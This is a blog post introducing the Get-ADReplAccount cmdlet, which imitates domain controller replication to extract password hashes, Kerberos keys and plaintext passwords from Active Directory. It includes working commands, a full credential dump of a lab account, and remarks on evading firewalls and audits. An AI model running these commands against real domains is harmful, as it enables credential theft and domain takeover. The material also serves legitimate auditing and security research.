---
ref: retrieving-active-directory-passwords-remotely
title: Retrieving Active Directory Passwords Remotely
date: 2015-08-04T10:38:08+00:00
layout: post
lang: en
permalink: /en/retrieving-active-directory-passwords-remotely/
tags:
    - 'Active Directory'
    - PowerShell
    - Security
---

I have finally finished work on the&nbsp;**Get-ADReplAccount** cmdlet, the&nbsp;newest addition to&nbsp;my [DSInternals PowerShell Module](/en/projects/), that&nbsp;can&nbsp;retrieve [reversibly encrypted plaintext passwords](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh994559(v=ws.11)), password hashes and&nbsp;Kerberos keys of&nbsp;all user accounts from&nbsp;remote domain controllers. This&nbsp;is&nbsp;achieved by&nbsp;simulating the&nbsp;behavior of&nbsp;the&nbsp;**dcromo** tool and&nbsp;creating a&nbsp;replica of&nbsp;Active Directory database through the&nbsp;[MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) protocol. Furthermore, it&nbsp;has these properties:

- It&nbsp;does not even&nbsp;need the&nbsp;Domain Admins group membership. The&nbsp;**Replicating Directory Changes All** permission is&nbsp;more than&nbsp;enough for&nbsp;this&nbsp;cmdlet to&nbsp;do&nbsp;its job.
- It&nbsp;opens door to&nbsp;other attacks, e.g. pass-the-hash, pass-the-ticket or&nbsp;PAC spoofing, that&nbsp;can&nbsp;be&nbsp;used to&nbsp;seize control of&nbsp;the&nbsp;entire Active Directory forest. Long live [mimikatz](https://github.com/gentilkiwi/mimikatz)!
- It&nbsp;cannot be&nbsp;effectively blocked by&nbsp;firewalls, because&nbsp;the&nbsp;directory replication service (DRSGetNCChanges call to&nbsp;be&nbsp;more precise) shares the&nbsp;same port with&nbsp;other critical services, like user name resolution (exposed by&nbsp;the&nbsp;DsCrackNames call).
- It&nbsp;only uses documented features of&nbsp;Active Directory and&nbsp;is&nbsp;not a&nbsp;hack per se.
- It&nbsp;leaves only minimal footprint on Domain Conrollers and&nbsp;can&nbsp;be&nbsp;easily overlooked by&nbsp;security audits.

Usage example:

```powershell
Import-Module DSInternals
$cred = Get-Credential
Get-ADReplAccount -SamAccountName April -Domain Adatum -Server LON-DC1 `
-Credential $cred -Protocol TCP
```

<!--more-->

Sample output:

```
DistinguishedName: CN=April Reagan,OU=IT,DC=Adatum,DC=com
Sid: S-1-5-21-3180365339-800773672-3767752645-1375
Guid: 124ae098-699b-4450-a47a-314a29cc90ea
SamAccountName: April
SamAccountType: User
UserPrincipalName: April@adatum.com
PrimaryGroupId: 513
SidHistory: 
Enabled: True
Deleted: False
LastLogon: 
DisplayName: April Reagan
GivenName: April
Surname: Reagan
Description: 
NTHash: 92937945b518814341de3f726500d4ff
LMHash: 727e3576618fa1754a3b108f3fa6cb6d
NTHashHistory: 
  Hash 01: 92937945b518814341de3f726500d4ff
  Hash 02: 1d3da193d2f45911a6f0fa940b9fb32f
  Hash 03: 402bc59d8a00641b7f386e78596340f4
LMHashHistory: 
  Hash 01: 727e3576618fa1754a3b108f3fa6cb6d
  Hash 02: 5a5503d0e85f58abaad3b435b51404ee
  Hash 03: f9393d97e7a1873caad3b435b51404ee
SupplementalCredentials:
  ClearText: Pa$$w0rd
  Kerberos:
    Credentials:
      DES_CBC_MD5
        Key: 76fe3b5bda911a40
    OldCredentials:
      DES_CBC_MD5
        Key: 7f8c4f38e0ea0b80
    Salt: ADATUM.COMApril
    Flags: 0
  KerberosNew:
    Credentials:
      AES256_CTS_HMAC_SHA1_96
        Key: 3a3b6a89bb82d112db5ef68f6db5d1afc2b806df61dcd85e3eacf3b85ee382d8
        Iterations: 4096
      AES128_CTS_HMAC_SHA1_96
        Key: a72c8bc96c4a6f03244f0b0067a1e440
        Iterations: 4096
      DES_CBC_MD5
        Key: 76fe3b5bda911a40
        Iterations: 4096
    OldCredentials:
      AES256_CTS_HMAC_SHA1_96
        Key: 14e46244a59a37cd8aa7c1fe61896441c7d065fafe4874191e69c1fe28856810
        Iterations: 4096
      AES128_CTS_HMAC_SHA1_96
        Key: 034b512ec64286dec951d6aff8d81fa8
        Iterations: 4096
      DES_CBC_MD5
        Key: 7f8c4f38e0ea0b80
        Iterations: 4096
    OlderCredentials:
      AES256_CTS_HMAC_SHA1_96
        Key: 2387ca8f936c8c154996809af8fee7c47fe4b9b5dd84d051fc43a9289bbaa3ab
        Iterations: 4096
      AES128_CTS_HMAC_SHA1_96
        Key: 29d536ec057f9063747161429b81f056
        Iterations: 4096
      DES_CBC_MD5
        Key: 58f1cbe6e50e1f83
        Iterations: 4096
    ServiceCredentials:
    Salt: ADATUM.COMApril
    DefaultIterationCount: 4096
    Flags: 0
  WDigest:
    Hash 01: c3d012ab1101eb8f51b483fb4c5f8a7e
    Hash 02: c993da396914645b356ae7816251fcb1
    Hash 03: 6b58530cab34de91189a603e22c2be15
    Hash 04: c3d012ab1101eb8f51b483fb4c5f8a7e
    Hash 05: 5a762cf59fa31023dcba1ebd4725b443
    Hash 06: c78bac91c0ba25cae5d44460fd65a73b
    Hash 07: 59d73cea16afd1aac6bf8acfa2768621
    Hash 08: d2be383db9469a39736d9e2136054131
    Hash 09: 079de9f4d94d97a80f1726497dfd1cc2
    Hash 10: 85dbe1549d5fbfcc91f7fe5ac5910f52
    Hash 11: 961a36bded5535b8fc15b4b8e6c48b93
    Hash 12: 6ac8a60d83e9ae67c2097db716a6af17
    Hash 13: e899e577d5f81ef5288ab67de07fad9a
    Hash 14: 135452ab86d40c3d47ca849646d5e176
    Hash 15: a84c367eaa334d0a4cb98e36da011e0f
    Hash 16: 61a458eb70440b1a92639452f0c2c948
    Hash 17: 238f4059776c3575be534afb46be4ccf
    Hash 18: 03ddf370064c544e9c6dbb6ccbf8f4ac
    Hash 19: 354dd6c77ccf35f63e48cd5af6473ccf
    Hash 20: 5f9800d734ebe9fb588def6aaafc40b7
    Hash 21: 59aab99ebcddcbf13b96d75bb7a731e3
    Hash 22: f1685383b0c131035ae264ee5bd24a8d
    Hash 23: 3119e42886b01cad00347e72d0cee594
    Hash 24: ebef7f2c730e17ded8cba1ed20122602
    Hash 25: 7d99673c9895e0b9c484e430578ee78e
    Hash 26: e1e20982753c6a1140c1a8241b23b9ea
    Hash 27: e5ec1c63e0e549e49cda218bc3752051
    Hash 28: 26f2d85f7513d73dd93ab3afd2d90cf6
    Hash 29: 84010d657e6b58ce233fae2bd7644222
```

You could even dump all accounts at once, but&nbsp;this&nbsp;can&nbsp;cause heavy (=suspicious) replication traffic:

```powershell
Get-ADReplAccount -All -NamingContext 'DC=Adatum,DC=com' -Server LON-DC1
```
